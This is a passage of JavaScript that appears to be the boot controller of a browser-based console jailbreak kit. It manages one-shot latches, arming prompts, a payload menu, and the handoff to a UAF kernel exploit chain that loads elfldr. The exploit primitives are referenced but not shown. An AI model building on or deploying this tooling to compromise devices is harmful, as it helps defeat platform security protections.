    // entry flow via ?go=1&auto=1&trigger=netcontrol&payload=1 (see index.html button).
    // That flow's pre-main timing is what the 12.00 addrof capture (core.js:706 ->
    // rwOriginalVector) needs; rushing main() left it NaN. p2jb still gets control via
    // the handoff after bootChain() in main().

    // UI preview: ?win=1 renders the success screen (gif + payload buttons)
    // WITHOUT running the exploit, so the win layout can be tested in any
    // browser. Does nothing to the console.
    if (Q.get("win") === "1") {
        stage("win-screen preview (?win=1) -- no exploit run");
        showWin();
        return;
    }

    screenLine("slopkit -- reading the one-shot latch from the host");

    // Already jailbroken? Show the payload menu instead of re-running the UAF on
    // an already-patched kernel (that risks a panic). Triggers on: explicit
    // ?payloads=1, a prior success this browser session, or -- as a fallback
    // that survives a reload -- a live elfldr on the console (host probe).
    const jb = jbRead();
    if (PAYLOADS_ONLY) {
        stage("payload menu requested -- skipping the exploit");
        await wkOnlySender("requested");
        return;
    }
    if (jb.session && !FORCE_RUN) {
        // Same browser session, so the console cannot have rebooted: certain.
        stage("already jailbroken this session -- payload menu (skipping the exploit)");
        await wkOnlySender("session");
        return;
    }
    // NOTE: the durable localStorage marker deliberately does NOT stop the run.
    // It survives a reboot, but the kernel patches do not - so after a reboot the marker
    // still says "jailbroken" while the console is actually clean, and bailing on it sent
    // people to the payload menu when what they wanted was to jailbreak. The authoritative
    // answer comes a minute later from prepare_fds(), which asks the CONSOLE whether
    // elfldr is accepting on 127.0.0.1:9021 - that cannot be stale, because elfldr does
    // not survive a reboot either. So the marker is only ever a hint here.
    if (jb.at) {
        const mins = Math.round((Date.now() - jb.at) / 60000);
        const when = mins < 90 ? mins + " min ago"
            : (mins < 2880 ? Math.round(mins / 60) + " h ago" : Math.round(mins / 1440) + " days ago");
        stage("this console was jailbroken " + when + " (in another session) -- checking "
            + "whether elfldr is still up before deciding");
    }
    if (ARMED) {
        // Host probe. NOTE: this exploit host answers unknown paths with index.html, so
        // r.ok alone is meaningless - an HTML page passes it and then r.json() throws,
        // which is why this check silently never fired. Require real JSON before
        // believing it, so the probe is correct if the endpoint ever appears and simply
        // inert while it does not.
        try {
            const r = await fetch("api/elfldr", { cache: "no-store" });
            const ct = r.headers.get("content-type") || "";
            if (r.ok && ct.indexOf("json") >= 0) {
                const j = await r.json();
                if (j && j.up) {
                    stage("elfldr already running on the console -- payload menu "
                        + "(skipping the exploit)");
                    showWin();
                    return;
                }
            }
        } catch (e) { }
    }

    if (CLEARLATCH) {
        renderNav("", false);
        await clearMain();
        return;
    }

    stage("checking the one-shot latch with the host");
    const l = await latch.read();
    if (latchIsLocal)
        stage("no exploit-host latch endpoint here - using a CLIENT-SIDE latch "
            + "(localStorage), which persists across reboots and browser restarts the "
            + "same way the host latch does. Clear it deliberately with ?clear=1 "
            + "(the menu buttons pass ?auto=1, which clears it for you).", "warn");
    flushMark("LATCH-READ", "set=" + (l.set ? 1 : 0)
        + "-detail=" + clean(l.detail || "")
        + (l.unreachable ? "-unreachable=" + l.unreachable : ""));

    if (l.unreachable) {
        renderNav(STALLED_AT, true);
        stage("cannot read the one-shot latch from the host ("
            + l.unreachable + "). check host.py is serving this page, then "
            + "reload", "bad");
        summaryEl.textContent = lastRunText();
        return;
    }

    // ?auto=1 clears the latch instead of asking; reboot between runs
    if (l.set && AUTOCLEAR) {
        flushMark("LATCH-AUTOCLEAR", clean(l.detail || ""));
        await latch.clear();
        stage("latch was set and ?auto=1 cleared it, set by: "
            + (l.detail || "(no detail)")
            + "\nassumes the console has been rebooted since that run.");
        l.set = false;
    }

    if (l.set) {
        renderNav(STALLED_AT, true);
        stage("the one-shot latch is set, by: " + (l.detail || "(no detail)")
            + "\n\nre-arming is only safe after a run that failed in the " + "prologue: setuid(1) is irreversible for the boot and the trigger " + "needs a fresh singly-referenced cred");
        summaryEl.textContent = lastRunText();
        flushMark("POOPS-LATCHED", clean(l.detail || ""));
        return;
    }

    if (!ARMED) {
        document.getElementById("arm").hidden = false;
        renderNav(STALLED_AT, false);
        stage("not armed" + (STALLED_AT ? " -- and the last run stopped at '"
            + STALLED_AT + "'" : ""));
        vitals(vitalsText("if armed with ?go=1 this page will open "));

        if (cfg.trigger !== "none"
            && !(cfg.trigger === "overflow" && cfg.burn !== "full")) {
            showVerdict(true, "this selection will leave the console needing A " + "REBOOT.\n");
            navEl.textContent = "";
            link("?go=1&trigger=" + cfg.trigger
                + (cfg.trigger === "overflow" ? "&burn=" + cfg.burn : ""),
                "ARM  " + cfg.trigger.toUpperCase()
                + (cfg.trigger === "overflow" ? " / BURN=" + cfg.burn : "")
                + "  -- I accept that this console will need A REBOOT",
                "one hot");

            link("?trigger=none", "no -- go back to the negative control",
                "extra");
            link("index.html", "back to slopkit", "extra");
        }
        summaryEl.textContent = lastRunText()
            + "\n\nSAME-process re-arm checks, and their limit stated honestly: " + "this page records the first socket fd it is given and the " + "process's uid, and can therefore notice that THIS WebProcess has " + "already run";
        flushMark("POOPS-IDLE", "rev=" + REV + "-armed=0-trigger=" + cfg.trigger);
        return;
    }

    if (STALLED_AT && !FROM && !ONLY.length) {

        renderNav(STALLED_AT, false);
        stage("the last run stopped at '" + STALLED_AT + "' but the latch is "
            + "clear, so pick a row explicitly", "bad");
        summaryEl.textContent = lastRunText();
        flushMark("POOPS-STALLED", STALLED_AT);
        return;
    }

    renderNav("", false);
    main().catch(err => {
        const m = (err && err.message) || String(err);
        stage("boot failed: " + m, "bad");
        flushMark("POOPS-FAILED", (err && err.name) + ":" + m.slice(0, 160));
        runInFlight = false;
        lockNav(false);
    });
})();
